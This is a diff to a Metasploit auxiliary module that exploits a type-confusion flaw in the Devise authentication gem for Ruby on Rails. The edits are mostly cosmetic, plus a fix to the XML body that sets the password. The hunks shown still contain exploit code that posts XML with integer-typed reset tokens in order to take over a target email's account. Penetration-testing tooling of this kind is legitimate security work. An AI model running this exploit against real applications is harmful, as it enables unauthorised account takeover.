@@ -14,7 +14,7 @@ class Metasploit3 < Msf::Auxiliary
 
 	def initialize(info = {})
 		super(update_info(info,
-			'Name'          => 'Rails Devise Authentication Gem Password Reset',
+			'Name'          => 'Ruby on Rails Devise Authentication Password Reset',
 			'Description'   => %q{
 					The Devise authentication gem for Ruby on Rails is vulnerable
 					to a password reset exploit leveraging type confusion.  By submitting XML
@@ -48,10 +48,10 @@ class Metasploit3 < Msf::Auxiliary
 		register_options(
 			[
 				OptString.new('URIPATH', [ true,  "The request URI", '/users/password']),
-				OptString.new('TARGETEMAIL', [true, "The Email address of target account", '']),
-				OptString.new('PASSWORD', [true, 'The password to set', "#{Rex::Text.rand_text_alpha(rand(10) + 5)}"]),
+				OptString.new('TARGETEMAIL', [true, "The email address of target account"]),
+				OptString.new('PASSWORD', [true, 'The password to set']),
 				OptBool.new('FLUSHTOKENS', [ true, 'Flush existing reset tokens before trying', true]),
-				OptInt.new('MAXINT', [true, "Max integer to try (Tokens begining with a higher int will fail)", 10])
+				OptInt.new('MAXINT', [true, "Max integer to try (tokens begining with a higher int will fail)", 10])
 			], self.class)
 	end
 
@@ -88,7 +88,7 @@ class Metasploit3 < Msf::Auxiliary
 
 			xml = ""
 			xml << "<user>"
-			xml << "<password>#{xmlpass}</password>"
+			xml << "<password>#{encode_pass}</password>"
 			xml << "<password_confirmation>#{encode_pass}</password_confirmation>"
 			xml << "<reset_password_token type=\"integer\">#{int_to_try}</reset_password_token>"
 			xml << "</user>"
